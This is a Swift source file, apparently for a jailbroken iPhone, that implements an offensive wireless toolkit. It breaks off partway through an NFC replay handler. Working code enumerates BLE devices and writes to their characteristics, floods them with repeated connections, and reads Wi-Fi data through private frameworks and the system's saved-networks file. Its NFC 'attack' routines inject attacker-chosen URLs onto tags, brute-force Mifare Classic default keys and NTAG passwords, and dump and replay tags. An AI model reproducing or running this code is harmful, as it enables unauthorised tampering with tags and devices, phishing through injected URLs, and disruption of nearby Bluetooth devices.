import Foundation
import CoreBluetooth
import CoreNFC
import Network
import SystemConfiguration.CaptiveNetwork
import CoreLocation
import ObjectiveC

// MARK: - BLE

struct GATTReport {
    var lines: [String] = []
    var writable: [(svc: String, chr: String)] = []
}

final class BLEScanner: NSObject, CBCentralManagerDelegate, CBPeripheralDelegate {
    private var central: CBCentralManager!
    private var peripherals: [String: CBPeripheral] = [:]
    private var onDiscover: ((TargetDevice) -> Void)?
    private var enumContinuation: CheckedContinuation<GATTReport, Never>?
    private var enumBuffer: [String] = []
    private var writableChars: [(svc: String, chr: String)] = []

    var isReady: Bool { central?.state == .poweredOn }

    override init() {
        super.init()
        central = CBCentralManager(delegate: self, queue: nil)
    }

    func centralManagerDidUpdateState(_ central: CBCentralManager) {
        // state handled at scan start
    }

    func startScan(timeout: TimeInterval, onDiscover: @escaping (TargetDevice) -> Void) {
        guard central.state == .poweredOn else {
            onDiscover(TargetDevice(name: "BT off/unavailable", proto: .ble, rssi: 0, via: "ble"))
            return
        }
        self.onDiscover = onDiscover
        central.scanForPeripherals(withServices: nil,
                                   options: [CBCentralManagerScanOptionAllowDuplicatesKey: false])
        DispatchQueue.main.asyncAfter(deadline: .now() + timeout) { [weak self] in
            self?.central.stopScan()
        }
    }

    func centralManager(_ central: CBCentralManager, didDiscover peripheral: CBPeripheral,
                        advertisementData: [String: Any], rssi RSSI: NSNumber) {
        let advName = advertisementData[CBAdvertisementDataLocalNameKey] as? String
        let vendorGuess = (advertisementData[CBAdvertisementDataManufacturerDataKey] as? Data)
            .flatMap { BLEScanner.guessVendor($0) }
        let name = advName ?? vendorGuess ?? String(peripheral.identifier.uuidString.prefix(8))
        var services: [String] = []
        if let s = advertisementData[CBAdvertisementDataServiceUUIDsKey] as? [CBUUID] {
            services = s.map { BLEScanner.friendlyService($0) }
        }
        var extra: [String: String] = [:]
        if let adv = advertisementData[CBAdvertisementDataManufacturerDataKey] as? Data {
            extra["companyID"] = String(format: "0x%04X", (UInt16(adv[0]) << 8) | UInt16(adv[1]))
        }
        if let tx = advertisementData[CBAdvertisementDataTxPowerLevelKey] as? NSNumber {
            extra["txPower"] = "\(tx)"
        }
        peripherals[peripheral.identifier.uuidString] = peripheral
        onDiscover?(TargetDevice(name: name, proto: .ble, rssi: RSSI.intValue,
                                 mac: peripheral.identifier.uuidString,
                                 vendor: BLEScanner.guessVendor(advertisementData[CBAdvertisementDataManufacturerDataKey] as? Data ?? Data()),
                                 services: services, via: "BLE adv", extra: extra))
    }

    static func guessVendor(_ adv: Data) -> String? {
        guard adv.count >= 2 else { return nil }
        let id = (UInt16(adv[0]) << 8) | UInt16(adv[1])
        switch id {
        case 0x004C: return "Apple"
        case 0x0006: return "Microsoft"
        case 0x0075: return "Samsung"
        case 0x0087: return "Garmin"
        case 0x0157: return "Anhui Huami (Amazfit)"
        case 0x0111: return "Anki"
        case 0x0131: return "iHealth"
        case 0x0059: return "Nordic Semiconductor"
        case 0x0206: return "FitBit"
        case 0x02E0: return "Tile"
        case 0x0171: return "Amazon"
        case 0x00E0: return "Google"
        case 0x038F: return "Xiaomi"
        case 0x06D5: return "Bosch"
        case 0x016B: return "Skeleton (smart wearables)"
        default: return nil
        }
    }

    static func friendlyService(_ u: CBUUID) -> String {
        switch u.uuidString {
        case "180F": return "Battery (0x180F)"
        case "180D": return "Heart Rate (0x180D)"
        case "1809": return "Health Thermometer (0x1809)"
        case "180A": return "Device Information (0x180A)"
        case "180C": return "User Data (0x180C)"
        case "1811": return "Alert Notification (0x1811)"
        case "FFF0", "FFE0", "FFF1": return "Vendor SVC \(u.uuidString)"
        case "FD6F": return "Matter/Thread (0xFD6F)"
        case "FE9F": return "Google Fast Pair (0xFE9F)"
        case "FE2C": return "Google (0xFE2C)"
        default: return "SVC \(u.uuidString)"
        }
    }

    // Enumerate GATT: connect → discover services/characteristics → dump
    func enumerate(_ target: TargetDevice, timeout: TimeInterval = 8) async -> GATTReport {
        guard central.state == .poweredOn,
              let per = peripherals[target.mac ?? ""] else {
            return GATTReport(lines: ["peripheral not in range/cache"])
        }
        enumBuffer = []
        writableChars = []
        return await withCheckedContinuation { cont in
            enumContinuation = cont
            per.delegate = self
            central.connect(per, options: nil)
            DispatchQueue.main.asyncAfter(deadline: .now() + timeout) { [weak self, weak per] in
                guard let self, let per else { return }
                if self.enumContinuation != nil {
                    self.central.cancelPeripheralConnection(per)
                }
            }
        }
    }

    func centralManager(_ central: CBCentralManager, didConnect peripheral: CBPeripheral) {
        peripheral.discoverServices(nil)
    }

    func peripheral(_ peripheral: CBPeripheral, didDiscoverServices error: Error?) {
        for s in peripheral.services ?? [] {
            enumBuffer.append("SVC \(BLEScanner.friendlyService(s.uuid))")
            peripheral.discoverCharacteristics(nil, for: s)
        }
        if peripheral.services?.isEmpty ?? true { finishEnum() }
    }

    func peripheral(_ peripheral: CBPeripheral, didDiscoverCharacteristicsFor service: CBService, error: Error?) {
        for c in service.characteristics ?? [] {
            var line = "  CHR \(c.uuid.uuidString) [\(propsText(c.properties))]"
            if c.value != nil { line += " val=\((c.value ?? Data()).hexPreview)" }
            enumBuffer.append(line)
            if c.properties.contains(.read) { peripheral.readValue(for: c) }
            if c.properties.contains(.write) || c.properties.contains(.writeWithoutResponse) {
                writableChars.append((service.uuid.uuidString, c.uuid.uuidString))
                enumBuffer.append("  ↳ WRITABLE → svc=\(service.uuid.uuidString) chr=\(c.uuid.uuidString)")
            }
        }
        if service == peripheral.services?.last { finishEnum() }
    }

    func peripheral(_ peripheral: CBPeripheral, didUpdateValueFor characteristic: CBCharacteristic, error: Error?) {
        if let v = characteristic.value, !v.isEmpty {
            enumBuffer.append("    val \(characteristic.uuid.uuidString): \(v.hexPreview)")
        }
    }

    func write(_ target: TargetDevice, service: String, characteristic: String,
               payload: Data, timeout: TimeInterval = 8) async -> String {
        guard central.state == .poweredOn,
              let per = peripherals[target.mac ?? ""] else { return "peripheral not in range/cache" }
        return await withCheckedContinuation { cont in
            writeCont = { cont.resume(returning: $0) }
            per.delegate = self
            writeTarget = (service, characteristic, payload)
            central.connect(per, options: nil)
            DispatchQueue.main.asyncAfter(deadline: .now() + timeout) { [weak self, weak per] in
                guard let self, let per else { return }
                if self.writeCont != nil { self.central.cancelPeripheralConnection(per) }
            }
        }
    }

    private var writeCont: ((String) -> Void)?
    private var writeTarget: (service: String, chr: String, payload: Data)?

    func flood(_ target: TargetDevice, attempts: Int) async -> Int {
        guard central.state == .poweredOn,
              let per = peripherals[target.mac ?? ""] else { return 0 }
        var done = 0
        for _ in 0..<attempts {
            await withCheckedContinuation { (c: CheckedContinuation<Void, Never>) in
                floodCont = { c.resume() }
                per.delegate = self
                central.connect(per, options: nil)
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.25) { [weak self, weak per] in
                    guard let self, let per else { return }
                    self.central.cancelPeripheralConnection(per)
                }
            }
            done += 1
        }
        return done
    }

    private var floodCont: (() -> Void)?

    func centralManager(_ central: CBCentralManager, didDisconnectPeripheral peripheral: CBPeripheral, error: Error?) {
        finishEnum()
        writeCont?("disconnected — write outcome unknown")
        writeCont = nil
        floodCont?()
        floodCont = nil
    }

    func centralManager(_ central: CBCentralManager, didFailToConnect peripheral: CBPeripheral, error: Error?) {
        finishEnum()
        writeCont?("connect failed: \(error?.localizedDescription ?? "?")")
        writeCont = nil
    }

    private func propsText(_ p: CBCharacteristicProperties) -> String {
        var s: [String] = []
        if p.contains(.read) { s.append("R") }
        if p.contains(.write) { s.append("W") }
        if p.contains(.writeWithoutResponse) { s.append("Wnr") }
        if p.contains(.notify) { s.append("N") }
        if p.contains(.indicate) { s.append("I") }
        return s.joined(separator: ",")
    }

    private func finishEnum() {
        let c = enumContinuation
        enumContinuation = nil
        c?.resume(returning: GATTReport(lines: enumBuffer, writable: writableChars))
    }
}

extension Data {
    var hexPreview: String {
        let hex = map { String(format: "%02x", $0) }.joined()
        return hex.count > 48 ? String(hex.prefix(48)) + "…" : hex
    }

    init?(hexString: String) {
        let s = hexString.replacingOccurrences(of: " ", with: "")
        guard s.count % 2 == 0, s.range(of: "^[0-9a-fA-F]+$", options: .regularExpression) != nil else { return nil }
        var d = Data()
        var i = s.startIndex
        while i < s.endIndex {
            let next = s.index(i, offsetBy: 2)
            d.append(UInt8(s[i..<next], radix: 16) ?? 0)
            i = next
        }
        self = d
    }
}

// MARK: - WiFi

final class WiFiScanner {
    struct WiFiNet: Identifiable {
        var id: String { ssid + bssid }
        var ssid: String
        var bssid: String
        var rssi: Int
        var sec: String
    }

    var lastDiag: String = ""
    private var diagLines: [String] = []
    private func diag(_ s: String) { diagLines.append(s) }

    // NEHotspotHelper persistente: registrato UNA volta per processo,
    // raccoglie le reti visibili a ogni scan di sistema
    static var helperActive = false
    static var helperNets: [WiFiNet] = []
    static let helperQueue = DispatchQueue(label: "rhs.hotspothelper")

    func availableNetworks() -> [WiFiNet] {
        diagLines = []
        CrashTracer.mark("wifi probe start")
        var nets: [WiFiNet] = []
        CrashTracer.mark("wifi: pre mobilewifi")
        if let n = probeMobileWiFi() { nets = n }
        else {
            CrashTracer.mark("wifi: pre helper")
            if let n = probeHotspotHelper() { nets = n }
            else {
                CrashTracer.mark("wifi: pre CNCopy")
                if let n = probeCurrentNetworkInfo() { nets = n }
                else {
                    CrashTracer.mark("wifi: pre NEHotspotNetwork")
                    if let n = probeHotspotCurrent() { nets = n }
                    else {
                        CrashTracer.mark("wifi: pre known-networks")
                        nets = probeKnownNetworksPlist()
                    }
                }
            }
        }
        CrashTracer.mark("wifi probe done (\(nets.count) nets)")
        lastDiag = diagLines.joined(separator: " || ")
        return nets
    }

    static func requestLocationPermission() {
        let lm = CLLocationManager()
        if lm.authorizationStatus == .notDetermined {
            lm.requestWhenInUseAuthorization()
        }
    }

    private func probeHotspotHelper() -> [WiFiNet]? {
        if !WiFiScanner.helperActive {
            let ok = NEHotspotHelper.register(queue: WiFiScanner.helperQueue) { cmd in
                guard let list = cmd.networkList, !list.isEmpty else { return }
                let nets = list.map { n -> WiFiNet in
                    WiFiNet(ssid: n.ssid, bssid: "?",
                            rssi: Int(-100 + n.signalStrength * 60),
                            sec: n.isSecure ? "WPA2/WPA3" : "OPEN")
                }
                WiFiScanner.helperNets = nets
            }
            if ok {
                WiFiScanner.helperActive = true
                diag("helper REGISTRATO — se restano 0 reti: apri Impostazioni › Wi-Fi (forza lo scan di sistema), torna e ri-scanca")
            } else {
                diag("helper register NEGATO (entitlement non onorato da questo JB)")
            }
        }
        if WiFiScanner.helperNets.isEmpty {
            // primo giro: aspetta un possibile callback immediato
            for _ in 0..<12 {
                if !WiFiScanner.helperNets.isEmpty { break }
                Thread.sleep(forTimeInterval: 0.5)
            }
        }
        diag("helper reti raccolte: \(WiFiScanner.helperNets.count)")
        return WiFiScanner.helperNets.isEmpty ? nil : WiFiScanner.helperNets
    }

    private func probeMobileWiFi() -> [WiFiNet]? {
        guard dlopen("/System/Library/PrivateFrameworks/MobileWiFi.framework/MobileWiFi", RTLD_NOW) != nil else {
            diag("dlopen MobileWiFi fallito")
            return nil
        }
        return probeFrameworkIntrospection(prefixes: ["WiFi"], label: "MobileWiFi")
    }

    private func probeFrameworkIntrospection(prefixes: [String], label: String) -> [WiFiNet]? {
        CrashTracer.mark("introspect \(label) start")
        defer { CrashTracer.mark("introspect \(label) done") }
        var count: UInt32 = 0
        guard let list = objc_copyClassList(&count) else {
            diag("\(label): objc_copyClassList nil")
            return nil
        }
        var wifiClasses: [String] = []
        for i in 0..<Int(count) {
            let name = String(cString: class_getName(list[i]))
            if prefixes.contains(where: name.hasPrefix) { wifiClasses.append(name) }
        }
        // NOTA: nessun free su list — l'SDK la marca autoreleasing (memoria gestita dal
        // runtime): liberarla è invalid free → crash. Leak trascurabile a scan manuale.
        diag("\(label) classi: \(wifiClasses.prefix(20).joined(separator: ", "))"
             + (wifiClasses.count > 20 ? " +\(wifiClasses.count - 20)" : ""))
        // sharedInstance SOLO su classi note — mai su nomi scoperti a runtime (assert interni)
        let known: Set<String> = ["WiFiManager", "WiFiManagerClient", "WiFiClientManager",
                                  "WiFiSystemClient", "WiFiController", "WiFiDevice"]
        let candidates = wifiClasses.filter { known.contains($0) }
        for cname in candidates {
            CrashTracer.mark("introspect \(cname): sharedInstance")
            guard let cls = NSClassFromString(cname) as? NSObject.Type,
                  cls.responds(to: NSSelectorFromString("sharedInstance")) else { continue }
            guard let shared = cls.perform(NSSelectorFromString("sharedInstance"))?.takeUnretainedValue() as? NSObject else {
                continue
            }
            CrashTracer.mark("introspect \(cname): method list")
            var mcount: UInt32 = 0
            let klass = object_getClass(shared) ?? cls
            guard let methods = class_copyMethodList(klass, &mcount) else { continue }
            var selNames: [String] = []
            for j in 0..<Int(mcount) {
                let m = methods[j]
                guard method_getNumberOfArguments(m) == 2 else { continue }
                let rt = method_copyReturnType(m)
                let isObj = rt[0] == UInt8(ascii: "@")
                free(rt)
                guard isObj else { continue }
                let sn = String(cString: sel_getName(method_getName(m)))
                let low = sn.lowercased()
                if low.contains("network") || low.contains("scan") || low.contains("list") || low.contains("ssid") {
                    selNames.append(sn)
                }
            }
            free(methods)
            diag("\(cname).sharedInstance metodi candidati: \(selNames.joined(separator: ", "))")
            // WHITELIST: mai chiamare metodi privati sconosciuti (crash su stato interno nil).
            // Il dump qui sopra serve a scoprire i NOMI reali sul device; i selector non
            // in whitelist restano dati nel journal — li hardcodiamo al prossimo giro.
            let whitelist: Set<String> = ["copyNetworkList", "networks", "allNetworks",
                                          "scanResults", "copyScanResults", "knownNetworks",
                                          "wifiNetworks", "networkList"]
            for sn in selNames where whitelist.contains(sn) {
                CrashTracer.mark("introspect call \(cname).\(sn)")
                guard let r = shared.perform(NSSelectorFromString(sn))?.takeUnretainedValue() as? NSArray,
                      r.count > 0 else { continue }
                diag("\(cname).\(sn) → \(r.count) elementi")
                var out: [WiFiNet] = []
                for el in r {
                    guard let obj = el as? NSObject else { continue }
                    let ssid = strField(obj, ["ssidName", "ssid", "SSID", "name", "networkName"]) ?? "?"
                    let bssid = strField(obj, ["bssid", "BSSID", "bssidString"]) ?? "?"
                    let rssi = intField(obj, ["rssi", "RSSI", "rssiValue"]) ?? -100
                    let sec = strField(obj, ["security", "securityType", "securityMode", "securityInformation"]) ?? "?"
                    if ssid != "?" { out.append(WiFiNet(ssid: ssid, bssid: bssid, rssi: rssi, sec: sec)) }
                }
                if !out.isEmpty { return out }
            }
        }
        diag("\(label): nessuna lista reti via introspezione")
        return nil
    }

    private func strField(_ obj: NSObject, _ sels: [String]) -> String? {
        for s in sels {
            let sel = NSSelectorFromString(s)
            guard obj.responds(to: sel) else { continue }
            if let v = obj.perform(sel)?.takeUnretainedValue() as? String, !v.isEmpty { return v }
        }
        return nil
    }

    private func intField(_ obj: NSObject, _ sels: [String]) -> Int? {
        for s in sels {
            let sel = NSSelectorFromString(s)
            guard let klass = object_getClass(obj), obj.responds(to: sel),
                  let m = class_getInstanceMethod(klass, sel) else { continue }
            let imp = method_getImplementation(m)
            typealias IntIMP = @convention(c) (NSObject, Selector) -> Int
            let f = unsafeBitCast(imp, to: IntIMP.self)
            return f(obj, sel)
        }
        return nil
    }

    private func probeCurrentNetworkInfo() -> [WiFiNet]? {
        let st = CLLocationManager().authorizationStatus
        if st == .notDetermined {
            diag("CNCopy: permesso location non ancora concesso — accetta il popup e ri-scanca")
            return nil
        }
        if st == .denied {
            diag("CNCopy: permesso location NEGATO — abilitalo in Impostazioni")
            return nil
        }
        guard let ifa = CNCopySupportedInterfaces() as? [String], !ifa.isEmpty else {
            diag("CNCopy: nessuna interfaccia supportata")
            return nil
        }
        for iface in ifa {
            guard let d = CNCopyCurrentNetworkInfo(iface as CFString) as? [String: Any] else { continue }
            let ssid = (d[kCNNetworkInfoKeySSID as String] as? String) ?? "?"
            let bssid = (d[kCNNetworkInfoKeyBSSID as String] as? String) ?? "?"
            guard ssid != "?" else { continue }
            diag("CNCopy \(iface): SSID \(ssid)")
            return [WiFiNet(ssid: ssid, bssid: bssid, rssi: -55, sec: "connesso")]
        }
        diag("CNCopy: interfacce [\(ifa.joined(separator: ","))] ma nessun SSID (non connesso o fw blocca)")
        return nil
    }

    private func probeHotspotCurrent() -> [WiFiNet]? {
        var result: [WiFiNet]?
        let sem = DispatchSemaphore(value: 0)
        NEHotspotNetwork.fetchCurrent { net in
            if let n = net {
                result = [WiFiNet(ssid: n.ssid, bssid: "?", rssi: -60, sec: n.isSecure ? "WPA2/WPA3" : "OPEN")]
            }
            sem.signal()
        }
        _ = sem.wait(timeout: .now() + 4)
        if result == nil { diag("NEHotspotNetwork.fetchCurrent: nil (non configurata dall'app)") }
        return result
    }

    // iOS 16+: cache delle reti conosciute — leggibile con entitlement no-sandbox
    private func probeKnownNetworksPlist() -> [WiFiNet] {
        var out: [WiFiNet] = []
        let paths = [
            "/var/mobile/Library/Preferences/com.apple.wifi.known-networks.plist",
            "/private/var/mobile/Library/Preferences/com.apple.wifi.known-networks.plist",
            "/var/wireless/Library/Preferences/com.apple.wifi.known-networks.plist",
        ]
        var existing: [String] = []
        for p in paths where FileManager.default.fileExists(atPath: p) { existing.append(p) }
        if existing.isEmpty {
            diag("known-networks: nessun file esistente (3 path provati)")
            return []
        }
        for p in existing {
            guard let dict = NSDictionary(contentsOfFile: p) as? [String: Any] else {
                diag("known-networks \(p): non parseabile")
                continue
            }
            diag("known-networks \(p): \(dict.count) key")
            for (key, val) in dict {
                guard let net = val as? [String: Any] else { continue }
                let ssid = (net["SSID"] as? String)
                    ?? (net["SSID"] as? Data).flatMap { String(data: $0, encoding: .utf8) }
                    ?? (net["ssid"] as? String) ?? "?"
                guard ssid != "?" else { continue }
                let bssid = (net["BSSID"] as? String) ?? (net["bssid"] as? String) ?? "?"
                let sec = (net["securityType"] as? String) ?? (net["security_type"] as? String) ?? "cached"
                if !out.contains(where: { $0.ssid == ssid }) {
                    out.append(WiFiNet(ssid: ssid, bssid: bssid, rssi: -70, sec: sec))
                }
            }
        }
        diag("known-networks: \(out.count) ssid estratti (\(existing.count) file)")
        return out
    }
}

import NetworkExtension

// MARK: - NFC

struct NFCTagFingerprint: Identifiable {
    var id: String { uid }
    let uid: String
    let family: String
    let ndefWritable: Bool
}

final class NFCScanner: NSObject, NFCNDEFReaderSessionDelegate, NFCTagReaderSessionDelegate {
    private var session: NFCTagReaderSession?
    private var ndefSession: NFCNDEFReaderSession?
    private var cont: CheckedContinuation<[String], Never>?
    private var buffer: [String] = []

    func scan(timeout: TimeInterval = 20) async -> [String] {
        guard NFCNDEFReaderSession.readingAvailable else { return ["NFC reader unavailable"] }
        buffer = []
        return await withCheckedContinuation { c in
            cont = c
            ndefSession = NFCNDEFReaderSession(delegate: self, queue: nil, invalidateAfterFirstRead: false)
            ndefSession?.begin()
            DispatchQueue.main.asyncAfter(deadline: .now() + timeout) { [weak self] in
                guard let self, self.cont != nil else { return }
                self.ndefSession?.invalidate()
            }
        }
    }

    func readerSession(_ session: NFCNDEFReaderSession, didInvalidateWithError error: Error) {
        let c = cont
        cont = nil
        if buffer.isEmpty { c?.resume(returning: ["NFC session invalidated: \(error.localizedDescription)"]) }
        else { c?.resume(returning: buffer) }
    }

    func readerSession(_ session: NFCNDEFReaderSession, didDetectNDEFs messages: [NFCNDEFMessage]) {
        for m in messages {
            for r in m.records {
                let payload = String(data: r.payload, encoding: .utf8) ?? r.payload.hexPreview
                buffer.append("NDEF \(r.typeNameFormat) type=\(String(data: r.type, encoding: .utf8) ?? "?") → \(payload.prefix(160))")
            }
        }
        session.invalidate()
    }

    private var scanCont: CheckedContinuation<NFCDump?, Never>?
    private var replayCont: CheckedContinuation<[String], Never>?
    private var replayBuffer: [String] = []
    private var replayDumpRef: NFCDump?

    func fullScan(timeout: TimeInterval = 25) async -> NFCDump? {
        guard NFCNDEFReaderSession.readingAvailable else { return nil }
        return await withCheckedContinuation { c in
            scanCont = c
            session = NFCTagReaderSession(pollingOption: [.iso14443], delegate: self, queue: nil)
            session?.alertMessage = "Avvicina il tag — dump completo…"
            session?.begin()
            DispatchQueue.main.asyncAfter(deadline: .now() + timeout) { [weak self] in
                guard let self, self.scanCont != nil else { return }
                self.session?.invalidate()
            }
        }
    }

    func replay(_ dump: NFCDump, timeout: TimeInterval = 25) async -> [String] {
        guard NFCNDEFReaderSession.readingAvailable else { return ["NFC reader unavailable"] }
        replayBuffer = ["replay \(dump.title) — \(dump.ndefHex.count) NDEF record(s)"]
        replayDumpRef = dump
        return await withCheckedContinuation { c in
            replayCont = c
            session = NFCTagReaderSession(pollingOption: [.iso14443], delegate: self, queue: nil)
            session?.alertMessage = "Avvicina il tag target per il replay…"
            session?.begin()
            DispatchQueue.main.asyncAfter(deadline: .now() + timeout) { [weak self] in
                guard let self, self.replayCont != nil else { return }
                self.session?.invalidate()
            }
        }
    }

    private func finishScan(_ d: NFCDump?) {
        session?.invalidate()
        let c = scanCont
        scanCont = nil
        c?.resume(returning: d)
    }

    private func finishReplay(_ lines: [String]) {
        session?.invalidate()
        let c = replayCont
        replayCont = nil
        c?.resume(returning: lines)
    }

    func tagReaderSession(_ session: NFCTagReaderSession, didInvalidateWithError error: Error) {
        if scanCont != nil {
            finishScan(buffer.isEmpty ? nil : NFCDump(uid: buffer.first ?? "?", family: "?", pages: [], ndefHex: [], ndefText: [], kind: "Partial"))
        }
        if replayCont != nil { finishReplay(replayBuffer) }
        if detectCont != nil { finishDetect(nil) }
        if attackCont != nil { finishAttack(attackBuffer.isEmpty ? ["sessione scaduta — riavvicina il tag entro il tempo limite"] : attackBuffer) }
    }

    func tagReaderSessionDidBecomeActive(_ session: NFCTagReaderSession) {}

    private var goal: Goal = .none
    private var detectCont: CheckedContinuation<NFCTagFingerprint?, Never>?
    private var attackCont: CheckedContinuation<[String], Never>?
    private var attackBuffer: [String] = []

    enum Goal {
        case none, detect
        case attack(String, [String: String])
    }

    func detect(timeout: TimeInterval = 20) async -> NFCTagFingerprint? {
        guard NFCNDEFReaderSession.readingAvailable else { return nil }
        goal = .detect
        return await withCheckedContinuation { c in
            detectCont = c
            session = NFCTagReaderSession(pollingOption: [.iso14443], delegate: self, queue: nil)
            session?.alertMessage = "Avvicina il tag da analizzare…"
            session?.begin()
            DispatchQueue.main.asyncAfter(deadline: .now() + timeout) { [weak self] in
                guard let self, self.detectCont != nil else { return }
                self.session?.invalidate()
            }
        }
    }

    func attack(_ vector: String, config: [String: String], timeout: TimeInterval = 25) async -> [String] {
        guard NFCNDEFReaderSession.readingAvailable else { return ["NFC reader unavailable"] }
        goal = .attack(vector, config)
        attackBuffer = []
        return await withCheckedContinuation { c in
            attackCont = c
            session = NFCTagReaderSession(pollingOption: [.iso14443], delegate: self, queue: nil)
            session?.alertMessage = "Riavvicina il tag per eseguire l'attacco…"
            session?.begin()
            DispatchQueue.main.asyncAfter(deadline: .now() + timeout) { [weak self] in
                guard let self, self.attackCont != nil else { return }
                self.session?.invalidate()
            }
        }
    }

    private func finishDetect(_ i: NFCTagFingerprint?) {
        session?.invalidate()
        let c = detectCont
        detectCont = nil
        goal = .none
        c?.resume(returning: i)
    }

    private func finishAttack(_ l: [String]) {
        session?.invalidate()
        let c = attackCont
        attackCont = nil
        goal = .none
        c?.resume(returning: l)
    }

    private func familyName(_ f: NFCMiFareFamily) -> String {
        switch f {
        case .ultralight: return "NTAG/Ultralight"
        case .desfire: return "DESFire"
        default: return "Mifare Classic"
        }
    }

    private func mifare(_ m: NFCMiFareTag, _ pkt: Data) async -> (Data, Error?) {
        await withCheckedContinuation { c in
            m.sendMiFareCommand(commandPacket: pkt) { result in
                switch result {
                case .success(let d): c.resume(returning: (d, nil))
                case .failure(let e): c.resume(returning: (Data(), e))
                }
            }
        }
    }

    private func probeClassicKeys(_ m: NFCMiFareTag) async -> [String] {
        let keys = ["FFFFFFFFFFFF", "A0A1A2A3A4A5", "D3F7D3F7D3F7"]
        var out = ["target Mifare Classic uid=\(m.identifier.hexPreview)",
                   "auth probe settore 4 con chiavi di fabbrica:"]
        for k in keys {
            guard let kd = Data(hexString: k), kd.count == 6 else { continue }
            let pkt = Data([0x60, UInt8(16)]) + kd + m.identifier.prefix(4)
            let r = await mifare(m, pkt)
            if r.1 == nil, r.0.count >= 4 {
                out.append("KEY FOUND: \(k) — settore 4 aperto con chiave standard → dump pieno possibile")
                return out
            }
        }
        out.append("nessuna chiave default valida — serve darkside/nested da Proxmark (PLAN)")
        return out
    }

    private func probeNTAGPwd(_ m: NFCMiFareTag) async -> [String] {
        let pwds = ["FFFFFFFF", "00000000", "A0A1A2A3", "41424344"]
        var out = ["target NTAG/Ultralight uid=\(m.identifier.hexPreview)",
                   "PWD dictionary probe:"]
        for p in pwds {
            guard let d = Data(hexString: p) else { continue }
            let r = await mifare(m, Data([0x1B]) + d)
            if r.1 == nil, r.0.count >= 2 {
                out.append("PWD FOUND: \(p) — PACK=\(r.0.hexPreview) → CFG scrivibile dopo auth")
                return out
            }
        }
        out.append("nessuna PWD default valida")
        return out
    }

    private func buildURIRecord(_ uri: String) -> CoreNFC.NFCNDEFPayload {
        var payload = Data()
        let pfx: UInt8
        let rest: String
        if uri.hasPrefix("https://") { pfx = 0x04; rest = String(uri.dropFirst(8)) }
        else if uri.hasPrefix("http://") { pfx = 0x03; rest = String(uri.dropFirst(7)) }
        else { pfx = 0x00; rest = uri }
        payload.append(pfx)
        payload.append(Data(rest.utf8))
        return CoreNFC.NFCNDEFPayload(format: CoreNFC.NFCTypeNameFormat.nfcWellKnown,
                                      type: Data("U".utf8), identifier: Data(), payload: payload)
    }

    func tagReaderSession(_ session: NFCTagReaderSession, didDetect tags: [NFCTag]) {
        switch goal {
        case .detect:
            handleDetect(tags, session)
        case .attack(let v, let cfg):
            handleAttack(v, cfg, tags, session)
        case .none:
            if replayCont != nil { handleReplay(tags, session); return }
            handleDump(tags, session)
        }
    }

    private func handleDetect(_ tags: [NFCTag], _ session: NFCTagReaderSession) {
        guard let t = tags.first, case let .miFare(m) = t else {
            session.alertMessage = "tag non supportato"
            session.invalidate()
            finishDetect(nil)
            return
        }
        let fam = familyName(m.mifareFamily)
        m.queryNDEFStatus { [weak self] (st: CoreNFC.NFCNDEFStatus, _: Int, _: (any Error)?) in
            guard let self else { return }
            let info = NFCTagFingerprint(uid: m.identifier.hexPreview, family: fam,
                                         ndefWritable: st == CoreNFC.NFCNDEFStatus.readWrite)
            session.alertMessage = "tag: \(fam)"
            self.finishDetect(info)
        }
    }

    private func handleAttack(_ vector: String, _ cfg: [String: String],
                              _ tags: [NFCTag], _ session: NFCTagReaderSession) {
        guard let t = tags.first, case let .miFare(m) = t else {
            session.alertMessage = "tag non riconosciuto"
            session.invalidate()
            finishAttack(["tag non riconosciuto"])
            return
        }
        let fam = familyName(m.mifareFamily)
        switch vector {
        case "ndef_inject":
            guard let url = cfg["url"], !url.isEmpty else { finishAttack(["URL mancante"]); return }
            let msg = NFCNDEFMessage(records: [buildURIRecord(url)])
            m.writeNDEF(msg) { [weak self] err in
                var lines = ["target \(fam) uid=\(m.identifier.hexPreview)", "payload: \(url)"]
                if let err {
                    lines.append("write FAIL: \(err.localizedDescription)")
                } else {
                    lines.append("NDEF INJECTED ✓ — il tag ora serve l'URL (auto-open su Android)")
                }
                self?.finishAttack(lines)
            }
        case "mifare_keys":
            guard fam == "Mifare Classic" else {
                finishAttack(["richiede Mifare Classic — questo tag è \(fam)"]); return
            }
            Task {
                let lines = await self.probeClassicKeys(m)
                self.finishAttack(lines)
            }
        case "ntag_pwd":
            guard fam == "NTAG/Ultralight" else {
                finishAttack(["richiede NTAG/Ultralight — tag: \(fam)"]); return
            }
            Task {
                let lines = await self.probeNTAGPwd(m)
                self.finishAttack(lines)
            }
        case "desfire_probe":
            finishAttack(["DESFire: CoPP crack richiede Proxmark/hardware dedicato — vettore PLAN"])
        default:
            finishAttack(["vettore \(vector) non eseguibile in sessione"])
        }
    }

    private func handleDump(_ tags: [NFCTag], _ session: NFCTagReaderSession) {
        guard let t = tags.first, case let .miFare(m) = t else {
            session.alertMessage = "Tag non supportato"
            session.invalidate()
            finishScan(nil)
            return
        }
        let fam = m.mifareFamily == .ultralight ? "NTAG/Ultralight" : "Mifare Classic"
        var dump = NFCDump(uid: m.identifier.hexPreview, family: fam,
                           pages: [], ndefHex: [], ndefText: [], kind: fam)
        m.queryNDEFStatus { [weak self] (st: CoreNFC.NFCNDEFStatus, _: Int, _: (any Error)?) in
            guard let self else { return }
            if st == CoreNFC.NFCNDEFStatus.readWrite || st == CoreNFC.NFCNDEFStatus.readOnly {
                m.readNDEF { msg, _ in
                    if let msg {
                        for r in msg.records {
                            dump.ndefHex.append(r.payload.hexPreview)
                            dump.ndefText.append(String(data: r.payload, encoding: .utf8) ?? r.payload.hexPreview)
                        }
                    }
                    self.readPages(m, dump)
                }
            } else {
                self.readPages(m, dump)
            }
        }
    }

    private func readPages(_ m: NFCMiFareTag, _ base: NFCDump) {
        var dump = base
        var page: UInt8 = 0
        func readNext() {
            if page >= 16 {
                finishScan(dump)
                return
            }
            m.sendMiFareCommand(commandPacket: Data([0x30, page])) { result in
                switch result {
                case .success(let data): dump.pages.append(data.hexPreview)
                case .failure(let e): dump.pages.append("ERR(\((e as NSError).code))")
                }
                page += 1
                readNext()
            }
        }
        readNext()
    }

    private func handleReplay(_ tags: [NFCTag], _ session: NFCTagReaderSession) {
        guard let t = tags.first, case let .miFare(m) = t, let dump = replayDumpRef else {
            session.alertMessage = "Tag non riconosciuto"
            session.invalidate()
            finishReplay(replayBuffer + ["tag non riconosciuto"])
            return
        }
        m.queryNDEFStatus { [weak self] (st: CoreNFC.NFCNDEFStatus, _: Int, _: (any Error)?) in
            guard let self else { return }
